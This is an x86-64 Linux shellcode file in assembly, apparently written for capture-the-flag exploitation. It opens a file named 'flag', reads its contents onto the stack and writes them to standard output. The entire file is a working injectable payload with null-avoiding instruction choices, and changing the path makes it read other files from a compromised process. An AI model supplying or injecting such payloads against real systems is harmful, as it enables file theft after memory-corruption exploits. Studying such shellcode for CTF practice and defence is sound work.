#
# linux shellcode x86-64:  write(1, read(open("flag"), &content, 256) )
# assumes rsp is valid
# 
# @_hugsy_
#

;;; init
xor rax, rax
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
xor rdi, rdi
xor rsi, rsi

;;; fd=sys_open(".///flag")
mov edx, 0x67616c66
shl rdx, 32
or  rdx, 0x2f2f2f2e
mov qword ptr [rsp], rdx
xor rdx, rdx
mov qword ptr [rsp+8], rdx
lea rdi, dword ptr [rsp]
mov al, 2
syscall
mov rdi, rax

;;; sys_read(fd, @.stack, 255)
xor rax, rax
sub sp, 260
lea rsi, [rsp]
mov dl, 255
syscall

;;; sys_write(1, @.stack, 255)
xor rax, rax
xor rdi, rdi
mov al, 1
inc rdi
syscall

;;; exit(1)
xor rax, rax
xor rdi, rdi
mov al, 60
syscall